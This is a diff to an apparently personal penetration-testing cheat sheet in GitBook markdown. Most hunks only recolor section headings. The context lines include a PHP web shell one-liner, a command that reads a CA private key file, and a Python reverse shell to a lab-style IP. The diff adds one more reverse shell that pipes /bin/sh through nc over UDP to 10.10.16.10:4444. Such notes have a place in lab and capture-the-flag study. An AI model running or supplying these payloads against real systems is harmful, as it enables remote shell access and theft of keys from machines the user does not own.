@@ -42,7 +42,7 @@ stty raw -echo; fg %1; export SHELL=/bin/bash; export TERM=screen; stty rows 38 
 
 ***
 
-### <mark style="color:purple;">Use</mark> <mark style="color:orange;">`arrow-keys`</mark>
+### <mark style="color:red;">`Use arrow-keys`</mark>
 
 * <mark style="color:purple;">Use</mark> <mark style="color:orange;">**`bash`**</mark><mark style="color:purple;">:</mark>
 
@@ -68,7 +68,7 @@ HISTFILESIZE=1000
 
 ***
 
-### <mark style="color:purple;">Clear Terminal</mark>
+### <mark style="color:red;">`Clear Terminal`</mark>
 
 * <mark style="color:purple;">Set the environmental variable from the terminal to</mark> <mark style="color:orange;">**`xterm`**</mark><mark style="color:purple;">:</mark>
 
@@ -78,7 +78,7 @@ export TERM=xterm
 
 ***
 
-### <mark style="color:purple;">Terminal Size</mark>
+### <mark style="color:red;">`Terminal Size`</mark>
 
 * <mark style="color:purple;">Before check the size of your terminal outside the remote shell to have a reference:</mark>
 
@@ -98,7 +98,7 @@ stty rows <NUMBER> columns <NUMBER>
 ## <mark style="color:purple;">Shells</mark>
 
 {% hint style="info" %}
-## <mark style="color:purple;">Spawning Shells</mark>
+## <mark style="color:red;">`Spawning Shells`</mark>
 
 * <mark style="color:purple;">The</mark> <mark style="color:orange;">**`pty`**</mark> <mark style="color:purple;">module in</mark> <mark style="color:green;">**`Python`**</mark> <mark style="color:purple;">allows you to spawn a new process in a pseudo-terminal, effectively creating an interactive shell:</mark>
 
@@ -176,13 +176,13 @@ exec "/bin/sh";
 ***
 
 {% hint style="info" %}
-## <mark style="color:purple;">`PSY`</mark>
+## <mark style="color:red;">`PSY`</mark>
 
 * <mark style="color:orange;">**`PSY`**</mark> <mark style="color:purple;">Shell is an interactive</mark> <mark style="color:orange;">**`PHP REPL (Read-Eval-Print Loop)`**</mark> <mark style="color:purple;">used normally for debugging.</mark>
 
 ***
 
-### <mark style="color:purple;">Useful Commands:</mark>
+### <mark style="color:red;">`Useful Commands:`</mark>
 
 {% code title="Very handy" %}
 ```sh
@@ -230,7 +230,7 @@ echo file_get_contents("home/nairobi/ca.key")
 ***
 
 {% hint style="warning" %}
-## <mark style="color:purple;">Web Shells</mark>
+## <mark style="color:red;">`Web Shells`</mark>
 
 ### <mark style="color:orange;">`PHP`</mark>
 
@@ -270,7 +270,7 @@ echo '<?php system($_REQUEST['cmd']); ?>' > cmd.php
 ***
 
 {% hint style="danger" %}
-## <mark style="color:purple;">Reverse Shells</mark>
+## <mark style="color:red;">`Reverse Shells`</mark>
 
 ### <mark style="color:orange;">`BASH`</mark> <mark style="color:purple;">Reverse Shells</mark>
 
@@ -341,6 +341,13 @@ s.connect(("10.10.14.157", 1235))
 [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
 subprocess.call(["/bin/sh", "-i"])
 s.close()' > shell.py
+```
+{% endcode %}
+
+{% code title="Uses UDP" overflow="wrap" %}
+```python
+import os
+os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u 10.10.16.10 4444 >/tmp/f &").read()
 ```
 {% endcode %}
 
